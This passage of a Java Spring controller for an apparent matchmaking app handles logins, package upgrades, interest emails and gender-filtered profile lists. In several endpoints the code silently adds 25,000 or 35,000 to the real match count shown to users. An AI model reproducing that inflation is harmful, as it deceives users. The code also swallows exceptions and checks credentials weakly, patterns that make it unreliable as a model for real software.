				userModel = null;
			}

		} catch (Exception e) {

		}
		JSONObject js = new JSONObject();
		JSONObject obj;
		try {
			HttpSession httpSession = request.getSession();
			httpSession.setAttribute("ActUserName", userModel.getFirstName());
			httpSession.setAttribute("ActUserId", userModel);

			try {
				if (userModel != null) {
					List<Kit_Upgrade_Or_Reg_Details> kit_Upgrade_Or_Reg_Details = kitUpgradeAndPaymentService
							.getKit_upgrade_or_reg_detailsByUserModel(userModel);

					Kit_Upgrade_Or_Reg_Details details;
					if (kit_Upgrade_Or_Reg_Details.size() > 0) {

						details = kit_Upgrade_Or_Reg_Details.get(0);
						long diff = details.getExpiryDate().getTime() - new Date().getTime();

						long diffMinutes = diff / (60 * 1000) % 60;
						long diffHours = diff / (60 * 60 * 1000) % 24;
						long diffDays = diff / (24 * 60 * 60 * 1000);
						int flag = 0;
						if (diffDays >= 1) {
							flag = 1;
						} else if (diffHours >= 1) {
							flag = 1;
						} else if (diffMinutes >= 1) {
							flag = 1;
						}

						if (flag == 1) {


							int profileCount = details.getNo_of_profile();
							UserModel visitedModel = new UserModel();
							visitedModel.setUserId(Long.parseLong(ShortlistVisitedId));

							SortlistedProfileUserWithDate sortlistedProfileUserWithDate = kitUpgradeAndPaymentService
									.getSortlistedProfileUser(userModel, visitedModel);

							if (profileCount > 0 || sortlistedProfileUserWithDate != null) {
								js.put("profileCount", true);

								if (details.getNo_of_email() > 0) {

									UserModelDetails modelDetails = userService.getUserdetails(visitedModel);
									MsgEmailSender.sendEmail(modelDetails.getEmail(),
											userModel.getFirstName() + " Sent Intrest to you", ShortlistEmail, request,
											setupService.getServerInfo());

									details.setNo_of_email(details.getNo_of_email() - 1);
									kitUpgradeAndPaymentService.updateKit_upgrade_or_reg_details(details);
								} else {
									js.put("profileCount", false);
								}

							} else {
								js.put("profileCount", false);
							}
						}

					} else {
						js.put("profileCount", false);
					}
					try {
						js.put("code", "1000");
						json = js.toString();
						httpSession.invalidate();
					} catch (Exception e) {

						js.put("code", "1001");
						js.put("ErrorMessage", e.getMessage());
						json = js.toString();
						e.printStackTrace();
					}

					ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
					json = js.toString();
					return json;
				}

			} catch (Exception e) {
				httpSession.invalidate();
				e.printStackTrace();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;

	}

	@RequestMapping(value = "/sneh/login/upgradePackage", method = RequestMethod.POST)
	@ResponseBody
	public String upgradePackage(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password, @RequestParam("kitId") String kitId,
			@RequestParam("kitPassword") String kitPassword) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {

				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);

				String KitId = kitId;
				String KitPassword = kitPassword;
				Kit kit = kitService.findKitByKitUserNamePassword(KitId, KitPassword);
				if (kit == null) {
					js.put("status", "InvalidKit");
				} else {
					if (kit.getStatus_id().getStatus_id() == 1) {
						js.put("status", "AlreadyAvailable");
					} else {

						Status status_id = new Status();
						status_id.setStatus_id(1);
						kit.setStatus_id(status_id);
						kitService.updateKitStatus(kit);
						userModel.setKit(kit);
						userService.addUser(userModel);

						List<com.xanadutec.coreflex.model.Kit_Upgrade_Or_Reg_Details> list_kit_Upgrade_Or_Reg_Details = kitUpgradeAndPaymentService
								.getKit_upgrade_or_reg_detailsByUserModel(userModel);

						if (list_kit_Upgrade_Or_Reg_Details.size() == 0) {

							Kit_Upgrade_Or_Reg_History_Details history_Details = new Kit_Upgrade_Or_Reg_History_Details();
							Kit_Upgrade_Or_Reg_Details kit_Upgrade_Or_Reg_Details = new Kit_Upgrade_Or_Reg_Details();
							kit_Upgrade_Or_Reg_Details.setKit_id(kit);
							kit_Upgrade_Or_Reg_Details
									.setNo_of_email(Integer.parseInt(kit.getPackage_id().getNo_of_email()));
							kit_Upgrade_Or_Reg_Details
									.setNo_of_email(Integer.parseInt(kit.getPackage_id().getNo_of_email()));
							kit_Upgrade_Or_Reg_Details
									.setNo_of_msg(Integer.parseInt(kit.getPackage_id().getNo_of_msg()));
							kit_Upgrade_Or_Reg_Details
									.setNo_of_profile(Integer.parseInt(kit.getPackage_id().getNo_of_profiles()));
							kit_Upgrade_Or_Reg_Details.setUserModel(userModel);

							// todo add no of days
							kit_Upgrade_Or_Reg_Details.setStatus("New");
							kit_Upgrade_Or_Reg_Details.setRegistrationDate(new Date());
							Calendar c = new GregorianCalendar();
							c.add(Calendar.DATE, Integer.parseInt(kit.getPackage_id().getNo_of_days()));
							Date expiredate = c.getTime();
							kit_Upgrade_Or_Reg_Details.setExpiryDate(expiredate);

							kitUpgradeAndPaymentService.saveKit_upgrade_or_reg_details(kit_Upgrade_Or_Reg_Details);
							try {
								history_Details.setExpiryDate(kit_Upgrade_Or_Reg_Details.getExpiryDate());
								history_Details.setRegistrationDate(kit_Upgrade_Or_Reg_Details.getRegistrationDate());
								history_Details.setActualUsedDate(new Date());
								history_Details.setNo_of_msg(kit_Upgrade_Or_Reg_Details.getNo_of_msg());
								history_Details.setNo_of_email(kit_Upgrade_Or_Reg_Details.getNo_of_email());
								history_Details.setNo_of_profile(kit_Upgrade_Or_Reg_Details.getNo_of_profile());
								history_Details.setStatus(kit_Upgrade_Or_Reg_Details.getStatus());
								history_Details.setPayment(Double.parseDouble(kit.getPackage_id().getAmount()));
								history_Details.setKit_id(kit_Upgrade_Or_Reg_Details.getKit_id());
								history_Details.setUserModel(kit_Upgrade_Or_Reg_Details.getUserModel());
								kitService.saveKit_Upgrade_Or_Reg_History_Details(history_Details);
							} catch (Exception e) {

							}

							js.put("expiryDate", kit_Upgrade_Or_Reg_Details.getExpiryDate());
							js.put("RegistrationDate", kit_Upgrade_Or_Reg_Details.getRegistrationDate());
							js.put("NoOfEmails", kit_Upgrade_Or_Reg_Details.getNo_of_email());
							js.put("NoOfMsg", kit_Upgrade_Or_Reg_Details.getNo_of_msg());
							js.put("NoOfProfile", kit_Upgrade_Or_Reg_Details.getNo_of_profile());

						} else {

							Kit_Upgrade_Or_Reg_History_Details history_Details = new Kit_Upgrade_Or_Reg_History_Details();
							Kit_Upgrade_Or_Reg_Details kit_Upgrade_Or_Reg_Details = list_kit_Upgrade_Or_Reg_Details
									.get(0);

							int old_no_msg = 0;
							int old_no_email = 0;
							int old_no_profile = 0;

							old_no_msg = kit_Upgrade_Or_Reg_Details.getNo_of_msg();
							old_no_email = kit_Upgrade_Or_Reg_Details.getNo_of_email();
							old_no_profile = kit_Upgrade_Or_Reg_Details.getNo_of_profile();

							kit_Upgrade_Or_Reg_Details.setKit_id(kit);
							kit_Upgrade_Or_Reg_Details.setNo_of_email(
									old_no_email + Integer.parseInt(kit.getPackage_id().getNo_of_email()));

							kit_Upgrade_Or_Reg_Details
									.setNo_of_msg(old_no_msg + Integer.parseInt(kit.getPackage_id().getNo_of_msg()));

							kit_Upgrade_Or_Reg_Details.setNo_of_profile(
									old_no_profile + Integer.parseInt(kit.getPackage_id().getNo_of_profiles()));

							kit_Upgrade_Or_Reg_Details.setUserModel(userModel);

							long diff = kit_Upgrade_Or_Reg_Details.getExpiryDate().getTime() - new Date().getTime();

							long diffMinutes = diff / (60 * 1000) % 60;
							long diffHours = diff / (60 * 60 * 1000) % 24;
							long diffDays = diff / (24 * 60 * 60 * 1000);
							int flag = 0;
							if (diffDays >= 1) {
								flag = 1;
							} else if (diffHours >= 1) {
								flag = 1;
							} else if (diffMinutes >= 1) {
								flag = 1;
							}

							if (flag == 1) {
								// todo add no of days
								kit_Upgrade_Or_Reg_Details.setStatus("ReNew");

								Calendar c = new GregorianCalendar();
								c.setTime(kit_Upgrade_Or_Reg_Details.getExpiryDate());
								kit_Upgrade_Or_Reg_Details.setRegistrationDate(c.getTime());
								c.add(Calendar.DATE, Integer.parseInt(kit.getPackage_id().getNo_of_days()));
								Date expiredate = c.getTime();
								kit_Upgrade_Or_Reg_Details.setExpiryDate(expiredate);
							} else {
								kit_Upgrade_Or_Reg_Details.setStatus("ReNew");
								kit_Upgrade_Or_Reg_Details.setRegistrationDate(new Date());
								Calendar c = new GregorianCalendar();
								c.add(Calendar.DATE, Integer.parseInt(kit.getPackage_id().getNo_of_days()));
								Date expiredate = c.getTime();
								kit_Upgrade_Or_Reg_Details.setExpiryDate(expiredate);
							}

							kitUpgradeAndPaymentService.updateKit_upgrade_or_reg_details(kit_Upgrade_Or_Reg_Details);
							try {
								history_Details.setExpiryDate(kit_Upgrade_Or_Reg_Details.getExpiryDate());
								history_Details.setRegistrationDate(kit_Upgrade_Or_Reg_Details.getRegistrationDate());
								history_Details.setActualUsedDate(new Date());
								history_Details.setNo_of_msg(kit_Upgrade_Or_Reg_Details.getNo_of_msg());
								history_Details.setNo_of_email(kit_Upgrade_Or_Reg_Details.getNo_of_email());
								history_Details.setNo_of_profile(kit_Upgrade_Or_Reg_Details.getNo_of_profile());
								history_Details.setStatus(kit_Upgrade_Or_Reg_Details.getStatus());
								history_Details.setPayment(Double.parseDouble(kit.getPackage_id().getAmount()));
								history_Details.setKit_id(kit_Upgrade_Or_Reg_Details.getKit_id());
								history_Details.setUserModel(kit_Upgrade_Or_Reg_Details.getUserModel());
								kitService.saveKit_Upgrade_Or_Reg_History_Details(history_Details);
							} catch (Exception e) {

							}

							js.put("expiryDate", kit_Upgrade_Or_Reg_Details.getExpiryDate());
							js.put("RegistrationDate", kit_Upgrade_Or_Reg_Details.getRegistrationDate());
							js.put("NoOfEmails", kit_Upgrade_Or_Reg_Details.getNo_of_email());
							js.put("NoOfMsg", kit_Upgrade_Or_Reg_Details.getNo_of_msg());
							js.put("NoOfProfile", kit_Upgrade_Or_Reg_Details.getNo_of_profile());

						}
						js.put("status", "Success");
					}
				}

				try {
					js.put("code", "1000");
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e)
			{
				e.printStackTrace();
			}

		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/viewListOfPackage", method = RequestMethod.POST)
	@ResponseBody
	public String viewListOfPackage(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) 
	{
		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {

				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);
				List<Package> packages = packageAndKitService.getListOfPackage();
				try {
					js.put("code", "1000");
					js.put("latestMatchCount", ow.writeValueAsString(packages));
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) 
			{
				e.printStackTrace();
			}

		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/viewLoginProfileData", method = RequestMethod.POST)
	@ResponseBody
	public String loginFirstProfileView(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) 
	{
		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				long latestMatchCount = 0;
				long latestUpgraded = 0;
				long notseenyet = 0;
				long seenyet = 0;
				long sortlisted = 0;

				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);

				List<UserProfileView> profileViews;
				UserModelDetails modelDetails = userService.getUserdetails(userModel);
				if (modelDetails.getGender().equalsIgnoreCase("male")) {
					profileViews = userService.getListOFProfileForHomeAccordingToGender("Female", request);
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Female");
					latestMatchCount = (latestMachesTotalCount+25000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Female");
					seenyet = userService.getCountOfAllSeenYetToGender("Female", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Female", userModel);
				} else {
					profileViews = userService.getListOFProfileForHomeAccordingToGender("Male", request);
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Male");
					latestMatchCount = (latestMachesTotalCount+35000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Male");
					seenyet = userService.getCountOfAllSeenYetToGender("Male", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Male", userModel);
				}
				try {
					notseenyet = latestMatchCount - seenyet;
				} catch (Exception e) {

				}

				try {
					js.put("code", "1000");
					js.put("latestUpgraded", latestUpgraded);
					js.put("seenyet", seenyet);
					js.put("notseenyet", notseenyet);
					js.put("sortlisted", sortlisted);
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("LatestMatch", ow.writeValueAsString(profileViews));
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) 
			{
				e.printStackTrace();
			}

		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/sortlistedProfileData", method = RequestMethod.POST)
	@ResponseBody
	public String sortlistedProfileData(final HttpServletRequest request, @RequestParam("userId") String userId,
			@RequestParam("username") String username, @RequestParam("password") String password) {
		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		List<UserModel> lstmodel = new ArrayList<>();
		try {
			String[] parts = userId.split(",");
			for (String string : parts) {
				try {
					UserModel model = userService.getUserById(Integer.parseInt(string));
					lstmodel.add(model);
				} catch (Exception ee) {
					ee.printStackTrace();
				}

			}
		} catch (Exception x) {
			x.printStackTrace();
		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {

				long latestMatchCount = 0;
				long latestUpgraded = 0;
				long notseenyet = 0;
				long seenyet = 0;
				long sortlisted = 0;
				
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);

				List<UserProfileView> profileViews;
				UserModelDetails modelDetails = userService.getUserdetails(userModel);
				if (modelDetails.getGender().equalsIgnoreCase("male")) {
					profileViews = userService.getListOFShortlistedOrIntrestedProfilesExcludeUserIds("Female", lstmodel,
							request);

					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Female");
					latestMatchCount = (latestMachesTotalCount+25000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Female");
					seenyet = userService.getCountOfAllSeenYetToGender("Female", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Female", userModel);
				
				} else {
					profileViews = userService.getListOFShortlistedOrIntrestedProfilesExcludeUserIds("Male", lstmodel,
							request);
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Male");
					latestMatchCount = (latestMachesTotalCount+35000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Male");
					seenyet = userService.getCountOfAllSeenYetToGender("Male", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Male", userModel);
				}
				
				try {
					notseenyet = latestMatchCount - seenyet;
				} catch (Exception e) {

				}

				try {
					js.put("code", "1000");
					js.put("latestUpgraded", latestUpgraded);
					js.put("seenyet", seenyet);
					js.put("notseenyet", notseenyet);
					js.put("sortlisted", sortlisted);
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("LatestMatch", ow.writeValueAsString(profileViews));
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}

		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/loadLatestMatches", method = RequestMethod.POST)
	@ResponseBody
	public String loadLatestMatches( HttpServletRequest request, @RequestParam("userId") String userId,
			@RequestParam("username") String username, @RequestParam("password") String password) {
		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		try {
			if (userModel == null) {
			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}
		} catch (Exception e) {
		}
		JSONObject obj;

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);

				UserModelDetails modelDetails = userService.getUserdetails(userModel);

				StringBuffer builder = new StringBuffer(userId);
				builder.deleteCharAt(builder.toString().length() - 1);

				String visitorArray[] = builder.toString().split(",");
				List<UserModel> models = new ArrayList<>();

				for (String string : visitorArray) {
					if (string.equalsIgnoreCase("null") || string.equals("")) {

					} else {
						UserModel model2 = new UserModel();
						model2.setUserId(Long.parseLong(string));
						models.add(model2);
					}
					
				}
				List<UserProfileView> profileViews;
				if (modelDetails.getGender().equalsIgnoreCase("male")) {
					profileViews = userService.getListOFProfileForHomeAccordingToGenderExcludeUserIds("Female", models,
							request);
				} else {
					profileViews = userService.getListOFProfileForHomeAccordingToGenderExcludeUserIds("Male", models,
							request);
				}

				try {
					js.put("code", "1000");
					js.put("LatestMatch", ow.writeValueAsString(profileViews));
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}

		}
		return json;
	}

	@RequestMapping(value = "/sneh/login/viewCompareUserProfileView", method = RequestMethod.POST)
	@ResponseBody
	public String viewLoginUserProfileData(final HttpServletRequest request, @RequestParam("userId") String userId,
			@RequestParam("username") String username, @RequestParam("password") String password) {


		UserModel userModelByCredentials = loginService.getUserByUnamePassword(username, password);
		HttpSession httpSession = request.getSession();
		httpSession.setAttribute("ActUserId", userModelByCredentials);

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModelByCredentials != null)) {
			try {
				final String pathact = request.getServletContext().getRealPath("/resources/UserImages");
				UserModel userModel1 = (UserModel) httpSession.getAttribute("ActUserId");
				final UserModelDetails modelDetails = userService.getUserdetails(userModel1);
				UserModel userModel = new UserModel();
				userModel.setUserId(Long.parseLong(userId));
				//UserModelImagesName userModelImagesName = userService.getImageNameAccordingToUserModel(userModel);
				
				CompareUserProfileView compareUserProfileView = userService
						.getCompareUserProfileViewAccordingToUserModelId(userModel, request);

				try {
					userService.saveVisitedProfileUserWithDate(userModel1, userModel);
					final UserModelDetails modelDetailsTo = userService.getUserdetails(userModel);
					Thread tt = new Thread(new Runnable() {
						public void run() {
							emailService.viewProfileSendEmail(modelDetails, modelDetailsTo, request, pathact);

						}
					});
					tt.start();

				} catch (Exception e) {
					e.printStackTrace();
				}

				try {
					js.put("code", "1000");
					js.put("compareUserProfileView", ow.writeValueAsString(compareUserProfileView));
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}

		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/viewNotSeenYetProfiles", method = RequestMethod.POST)
	@ResponseBody
	public String viewNotSeenYetProfiles(final HttpServletRequest request, @RequestParam("userId") String userId,
			@RequestParam("username") String username, @RequestParam("password") String password) {
		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		List<UserModel> lstmodel = new ArrayList<>();
		try {
			String[] parts = userId.split(",");
			for (String string : parts) {
				try {
					UserModel model = userService.getUserById(Integer.parseInt(string));
					lstmodel.add(model);
				} catch (Exception ee) {
				}
			}
		} catch (Exception x) {

		}
		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);
				List<UserProfileView> profileViews;
				long latestMatchCount = 0;
				long latestUpgraded = 0;
				long notseenyet = 0;
				long seenyet = 0;
				long sortlisted = 0;
				UserModelDetails modelDetails = userService.getUserdetails(userModel);
				if (modelDetails.getGender().equalsIgnoreCase("male")) {
					profileViews = userService.getListOFNotSeenYetProfilesExcludeUserIds("Female", lstmodel, request);
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Female");
					latestMatchCount = (latestMachesTotalCount+25000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Female");
					seenyet = userService.getCountOfAllSeenYetToGender("Female", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Female", userModel);
				} else {
					profileViews = userService.getListOFNotSeenYetProfilesExcludeUserIds("Male", lstmodel, request);
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Male");
					latestMatchCount = (latestMachesTotalCount+35000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Male");
					seenyet = userService.getCountOfAllSeenYetToGender("Male", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Male", userModel);
				}
				try {
					notseenyet = latestMatchCount - seenyet;
				} catch (Exception e) {

				}

				try {
					js.put("code", "1000");
					js.put("latestUpgraded", latestUpgraded);
					js.put("seenyet", seenyet);
					js.put("notseenyet", notseenyet);
					js.put("sortlisted", sortlisted);
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("LatestMatch", ow.writeValueAsString(profileViews));
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}

		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/viewViewedYetProfiles", method = RequestMethod.POST)
	@ResponseBody
	public String viewViewedYetProfiles(final HttpServletRequest request, @RequestParam("userId") String userId,
			@RequestParam("username") String username, @RequestParam("password") String password) {
		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		List<UserModel> lstmodel = new ArrayList<>();
		try {
			String[] parts = userId.split(",");
			for (String string : parts) {
				try {
					UserModel model = userService.getUserById(Integer.parseInt(string));
					lstmodel.add(model);
				} catch (Exception ee) {
					ee.printStackTrace();
				}
			}
		} catch (Exception x) {
			x.printStackTrace();
		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {

				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);

				List<UserProfileView> profileViews;
				long latestMatchCount = 0;
				long latestUpgraded = 0;
				long notseenyet = 0;
				long seenyet = 0;
				long sortlisted = 0;
				UserModelDetails modelDetails = userService.getUserdetails(userModel);
				if (modelDetails.getGender().equalsIgnoreCase("male")) {
					profileViews = userService.getListOFViewedYetProfilesExcludeUserIds("Female", lstmodel, request);

					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Female");
					latestMatchCount = (latestMachesTotalCount+25000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Female");
					seenyet = userService.getCountOfAllSeenYetToGender("Female", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Female", userModel);					
				} else {
					profileViews = userService.getListOFViewedYetProfilesExcludeUserIds("Male", lstmodel, request);
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Male");
					latestMatchCount = (latestMachesTotalCount+35000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Male");
					seenyet = userService.getCountOfAllSeenYetToGender("Male", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Male", userModel);
				}
				try {
					notseenyet = latestMatchCount - seenyet;
				} catch (Exception e) {

				}
				try {
					js.put("code", "1000");
					js.put("latestUpgraded", latestUpgraded);
					js.put("seenyet", seenyet);
					js.put("notseenyet", notseenyet);
					js.put("sortlisted", sortlisted);
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("LatestMatch", ow.writeValueAsString(profileViews));
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}

		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/viewLatestUpdatedProfileData", method = RequestMethod.POST)
	@ResponseBody
	public String viewLatestUpdatedProfileData(final HttpServletRequest request, @RequestParam("userId") String userId,
			@RequestParam("username") String username, @RequestParam("password") String password) {
		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		List<UserModel> lstmodel = new ArrayList<>();
		try {
			String[] parts = userId.split(",");
			for (String string : parts) {
				try {
					UserModel model = userService.getUserById(Integer.parseInt(string));
					lstmodel.add(model);
				} catch (Exception ee) {
				}

			}
		} catch (Exception x) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				
				long latestMatchCount = 0;
				long latestUpgraded = 0;
				long notseenyet = 0;
				long seenyet = 0;
				long sortlisted = 0;
				
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				httpSession.setAttribute("ActUserId", userModel);

				List<UserProfileView> profileViews;
				UserModelDetails modelDetails = userService.getUserdetails(userModel);
				if (modelDetails.getGender().equalsIgnoreCase("male")) {
					profileViews = userService.getListOFLatestUpgradedUserForHomeAccordingToGenderExcludeUserIds(
							"Female", lstmodel, request);
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Female");
					latestMatchCount = (latestMachesTotalCount+25000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Female");
					seenyet = userService.getCountOfAllSeenYetToGender("Female", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Female", userModel);
				} else {
					profileViews = userService.getListOFLatestUpgradedUserForHomeAccordingToGenderExcludeUserIds("Male",
							lstmodel, request);
					
					long latestMachesTotalCount = userService.getCountOfAllLatestMatchAccordingToGender("Male");
					latestMatchCount = (latestMachesTotalCount+35000);
					latestUpgraded = userService.getCountOfAllLatestUpgradedMatchAccordingToGender("Male");
					seenyet = userService.getCountOfAllSeenYetToGender("Male", userModel);
					sortlisted = userService.getCountOfShortlistedToGender("Male", userModel);
				}
				try {
					notseenyet = latestMatchCount - seenyet;
				} catch (Exception e) {

				}
				try {
					js.put("code", "1000");
					js.put("latestUpgraded", latestUpgraded);
					js.put("seenyet", seenyet);
					js.put("notseenyet", notseenyet);
					js.put("sortlisted", sortlisted);
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("latestMatchCount", ow.writeValueAsString(latestMatchCount));
					js.put("LatestMatch", ow.writeValueAsString(profileViews));
					json = js.toString();
					httpSession.invalidate();

				} catch (Exception e) {

					js.put("code", "1001");
					
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
					e.printStackTrace();
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				e.printStackTrace();
			}

		}
		return json;

	}

	@RequestMapping(value = "/sneh/login/mobileRegistration ", method = RequestMethod.POST)
	@ResponseBody
	public String mobileRegistration(MultipartHttpServletRequest request1, final HttpServletRequest request,
			@RequestParam("registrationDict") String dict) {

		JSONObject obj;
		JSONObject js = new JSONObject();
		String json = null;
		String KundaliName=""; 
		try {

			obj = new JSONObject(dict);
			final JSONObject jsonObj = obj;

			String materialStatusPartner = jsonObj.getString("partnerMaritalStatus");
			String physicalStatusPartner = jsonObj.getString("partnerPhysicalStatus");
			String bodyTypePartner = jsonObj.getString("partnerBodyType");
			String complexionPartner = jsonObj.getString("partnerComplexion");
			String heightSelectPartnerFirst = jsonObj.getString("partnerFromHeight");
